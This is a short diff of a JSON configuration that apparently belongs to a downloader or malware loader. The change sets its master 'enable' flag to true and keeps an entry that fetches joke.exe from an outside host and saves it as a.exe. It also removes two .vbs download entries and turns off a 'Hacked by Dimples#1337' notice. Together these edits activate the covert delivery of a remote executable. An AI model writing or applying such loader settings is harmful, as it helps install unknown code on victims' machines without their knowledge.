@@ -1,14 +1,6 @@
 {
-  "enable": false,
+  "enable": true,
   "inneed": [
-    {
-      "url": "https://ling-res.guimc.ltd/a.vbs",
-      "name": "a.vbs"
-    },
-    {
-      "url": "https://ling-res.guimc.ltd/b.vbs",
-      "name": "b.vbs"
-    },
     {
       "url": "https://ling-res.guimc.ltd/joke.exe",
       "name": "a.exe"
@@ -25,7 +17,7 @@
     }
   },
   "runtips": {
-    "enable": true,
+    "enable": false,
     "text": "Hacked by Dimples#1337"
   },
   "run": {
